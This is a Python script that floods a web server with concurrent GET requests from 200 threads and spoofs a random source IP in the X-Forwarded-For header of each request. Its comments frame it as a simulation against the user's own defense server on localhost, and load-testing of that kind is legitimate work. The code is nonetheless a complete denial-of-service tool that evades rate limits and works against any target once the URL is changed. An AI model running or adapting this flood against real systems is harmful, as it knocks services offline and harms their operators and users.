import requests
import random
import threading
import time

# Configuration
TARGET_URL = "http://localhost:5000"  # Your defense server URL
THREADS = 200                         # Concurrent attack threads
DURATION = 30                      # Attack duration (seconds)

# Generate random IPs
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

# Attack function
def flood():
    while True:
        try:
            headers = {
                "X-Forwarded-For": random_ip(),  # Spoof IP in headers
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            response = requests.get(TARGET_URL, headers=headers)
            print(f"Sent request from {headers['X-Forwarded-For']} | Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

# Start attack threads
threads = []
for _ in range(THREADS):
    t = threading.Thread(target=flood)
    t.daemon = True
    threads.append(t)
    t.start()

# Run for specified duration
time.sleep(DURATION)
print("Attack simulation completed.")